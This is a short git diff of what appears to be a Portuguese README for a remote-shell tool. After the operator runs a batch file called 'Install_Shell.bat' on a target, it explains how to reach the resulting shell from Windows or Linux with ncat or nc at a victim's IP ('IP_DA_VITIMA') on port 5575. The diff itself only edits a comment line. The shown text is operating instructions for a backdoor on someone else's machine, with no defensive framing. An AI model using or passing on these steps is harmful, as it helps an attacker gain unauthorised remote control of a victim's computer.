@@ -42,7 +42,7 @@ OBS: (Assim que executado o `Install_Shell.bat` e ganhar a shell, é recomendado
 # Windows (via ncat)
 ncat IP_DA_VITIMA 5575
 
-# Linux (via nc ou ncat)
+# Linux (via nc)
 nc IP_DA_VITIMA 5575
 ```
 
